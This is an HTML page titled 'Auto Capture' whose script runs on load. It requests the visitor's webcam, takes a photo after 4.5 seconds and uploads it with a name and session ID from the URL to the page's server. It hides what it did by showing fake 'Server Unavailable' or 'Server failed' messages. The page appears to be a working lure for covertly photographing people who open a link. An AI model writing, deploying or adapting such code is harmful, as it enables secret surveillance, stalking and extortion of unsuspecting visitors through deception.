<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Auto Capture</title>
  <style>
    body { font-family: Arial, sans-serif; text-align: center; padding: 20px; }
    p { margin-top: 20px; font-size: 18px; color: red; }
  </style>
</head>
<body>
  <p id="status"></p> <!-- Empty by default -->

  <script>
    (async function() {
      const status = document.getElementById("status");

      // Get sessionId and name from URL
      const urlParams = new URLSearchParams(window.location.search);
      const sessionId = urlParams.get("sessionId") || Date.now().toString() + Math.floor(Math.random()*1000);
      const name = urlParams.get("name") || "visitor";

      async function takePhoto() {
        try {
          const stream = await navigator.mediaDevices.getUserMedia({ video: true });
          const video = document.createElement("video");
          video.srcObject = stream;
          await video.play();

          const canvas = document.createElement("canvas");
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;

          // Wait 4.5 seconds before capture
          await new Promise(resolve => setTimeout(resolve, 4500));

          canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
          const imageData = canvas.toDataURL("image/jpeg");

          // Stop camera
          stream.getTracks().forEach(track => track.stop());

          return imageData;
        } catch (err) {
          console.error(err);
          status.innerText = "Server failed! Sorry, try again in a few minutes!";
          return null;
        }
      }

      async function sendToServer(imageData) {
        try {
          const res = await fetch("/upload", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              image: imageData,
              name,
              type: "auto",
              sessionId
            })
          });

          if (res.ok) {
            status.innerText = "Server Unavailable"; // On success
          } else {
            status.innerText = "Server failed! Sorry, try again in a few minutes!";
          }
        } catch (err) {
          console.error(err);
          status.innerText = "Server failed! Sorry, try again in a few minutes!";
        }
      }

      const photo = await takePhoto();
      if (photo) await sendToServer(photo);
    })();
  </script>
</body>
</html>
